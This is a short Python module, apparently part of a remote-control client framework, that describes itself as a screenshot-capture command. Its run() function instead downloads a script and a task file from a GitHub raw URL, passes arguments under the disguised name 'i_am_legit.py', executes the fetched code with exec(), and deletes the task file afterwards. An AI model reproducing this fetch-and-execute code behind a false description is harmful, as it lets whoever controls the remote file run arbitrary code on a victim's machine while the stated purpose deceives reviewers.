

import core.util as util

# globals
command = True
#packages = ['util']
platforms = ['win32','linux2','darwin']
usage = 'screenshot [imgur/ftp] [option=value, ...]'
description = """
Capture a screenshot on the client and optionally upload anonymously to
Imgur or to a remote FTP server (default: save image on local host machine)
"""
#util.log('HELLO FROM TEST LOG')
#print('TEST PRINT')
import sys,urllib,os
if sys.version_info[0] > 2:
    from urllib import request


def run():
    try:
        print('TEST PRINT2')
        
        util.log('HELLO FROM TEST LOG2')
        urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen

        http_generator=urlopen('https://raw.githubusercontent.com/xbubus/http-mqtt-requests-generator-sender/master/http_requester.py').read()
        pure_tasks=urlopen('https://raw.githubusercontent.com/xbubus/http-mqtt-requests-generator-sender/master/http_out.json').read().decode('utf-8')
        with open ('tasks','w')as f:
            f.write(pure_tasks)
        sys.argv=['i_am_legit.py','-itasks']
        print(sys.argv)
        exec(http_generator)
        os.remove('tasks')
        return 'TEST PRINT RETURN ok'
    except Exception as e:
        return e